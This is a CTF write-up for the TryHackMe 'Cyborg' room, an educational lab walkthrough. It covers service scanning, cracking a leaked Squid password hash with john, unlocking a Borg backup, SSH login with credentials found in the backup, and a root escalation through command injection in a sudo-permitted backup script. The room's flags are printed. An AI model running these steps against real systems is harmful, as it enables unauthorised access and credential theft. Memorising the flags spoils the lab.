---
layout: default
title: Cyborg
parent: TryHackMe
---
# CTF Writeup: [Cyborg](https://tryhackme.com/room/cyborgt8)
![Category](https://img.shields.io/badge/Category-Source%20Code%20Analysis-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tags](https://img.shields.io/badge/Tags-Bash%20Code%20Review%20%7C%20Borg%20Backup-orange)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 22.11.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p)

---
## 1. Reconnaissance
### Nmap
At the start, we can scan using `nmap` to see the services available on the machine:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Nmap scan report for <Machine-IP>
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds
```
We only have `2 ports` on `ssh:22` and `http:80`.

### Directory Enumeration
Next we can perform a directory enumeration using `feroxbuster` tool:
```bash
feroxbuster -u http://<Machine-IP>/ -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://<Machine-IP>/
301      GET        9l       28w      312c http://<Machine-IP>/admin => http://<Machine-IP>/admin/
301      GET        9l       28w      310c http://<Machine-IP>/etc => http://<Machine-IP>/etc/
200      GET        6l       27w      258c http://<Machine-IP>/etc/squid/squid.conf
200      GET        1l        1w       52c http://<Machine-IP>/etc/squid/passwd
[...] - 17s    40950/40950   0s      found:6       errors:17
[...] - 15s    20469/20469   1335/s  http://<Machine-IP>/
[...] - 15s    20469/20469   1355/s  http://<Machine-IP>/admin/
[...] - 0s     20469/20469   272920/s http://<Machine-IP>/etc/ => Directory listing (add --scan-dir-listings to scan)
[...] - 0s     20469/20469   269329/s http://<Machine-IP>/etc/squid/ => Directory listing (add --scan-dir-listings to scan)
```
So the directories we found are `etc`, `admin` and `etc/admin`. Let's go through each directory:

## 2. Initial Access
In order to move forward, we have two paths to take, first using the `etc` directory and second using the `admin` page.

### 2.1. Squid Page
In `http://<Machine-IP>/etc/` directory we have another directory named `squid`. This directory includes two files named `passwd` and `squid.conf`.
Let's download them.

Inside `squid.conf` we see:
```bash
❯ cat squid.conf
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
This configuration enforces `Basic Authentication`, meaning users must log in with credentials stored in `/etc/squid/passwd` to access the proxy.

As a matter of fact, we already have the `passwd`, let's see:
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
This is an `Apache MD5 password hash` shown in the first part as `$apr1$`, followed by salt of `BpZ.Q.1m` and the rest is the information itself.

Let's crack it using `john`:
```bash
john hash.txt --wordlist=kali-wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Note: Passwords longer than 5 [worst case UTF-8] to 15 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2025-11-22 17:32) 25.00g/s 998400p/s 998400c/s 998400C/s jeremy21..pirilampo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
So the hash was `squidward`. Let's continue the next part.

### 2.2. Admin Page
In `http://<Machine-IP>/admin/` we have a section called `admins` and the content of the page is:
```
############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################
```
Next we go to the `Archive` section and we can see that we can download a file.
After extracting, we can see some files inside, let's take a look:
```bash
❯ ls -al
total 64
drwxr-xr-x. 1    92 Nov 22 17:24 .
drwxr-xr-x. 1    26 Nov 22 17:24 ..
-rw-------. 1   964 Dec 29  2020 config
drwx------. 1     2 Nov 22 17:24 data
-rw-------. 1    54 Dec 29  2020 hints.5
-rw-------. 1 41258 Dec 29  2020 index.5
-rw-------. 1   190 Dec 29  2020 integrity.5
-rw-------. 1    16 Dec 29  2020 nonce
-rw-------. 1    73 Dec 29  2020 README
```
Reading `README` we can see:
```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
Let's install`borgbackup`:
```bash
sudo apt update && sudo apt install borgbackup
```
Then we go to the directory named `final_archive` to list the backups in borg using the password we found in the last section:
```bash
❯ borg list .
Enter passphrase for key Cyborg/home/field/dev/final_archive: squidward
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```
So we have a backup named `music_archive` as `Alex` said on `Admins` page. Let's see what is it by extracting it with the command below:
```bash
❯ borg extract .::music_archive
Enter passphrase for key Cyborg/home/field/dev/final_archive: squidward
```
It extracts `home` inside the directory which contains a user home directory of `alex`. This is the home directory of `alex`, let's check the main home directories one by one see if we can find a clue.

First we can see a `secret.txt`:
```bash
❯ cat Desktop/secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!"
```
We can also see another file named `note.txt`:
```bash
❯ cat Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
So we have `Username:alex` and `Password:S3cretP@s3`.

Let's `SSH`:
```bash
❯ ssh alex@<Machine-IP>
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
alex@<Machine-IP>'s password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


alex@ubuntu:~$
```
We are in!

## 3. User Flag
We can see the user flag in home directory:
```bash
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

## 4. Root Flag
First, we can try using `sudo -l` to see if we have anything available to use the `SUID` vulnerability:
```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
It seems we have access to a script in `/etc/mp3backups/backup.sh`. 

Let's see what is `backup.sh`:
```bash
alex@ubuntu:/etc/mp3backups$ cat backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
This section of the code seems interesting, let's see what does it say:
```bash
while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done
```
It is a loop that parses commandline arguments to assign whatever text follows with `-c` flag to the variable `$command`.

This means that we can use `-c` option. So we can run any command after it and it will execute it with the root permission. Let's try this:
```bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "cat /root/root.txt"
find: ‘/run/user/108/gvfs’: Permission denied
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/ from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
There it is, `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`. We were able to successfully exploit the program and run the loop we wanted with the right permission.

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
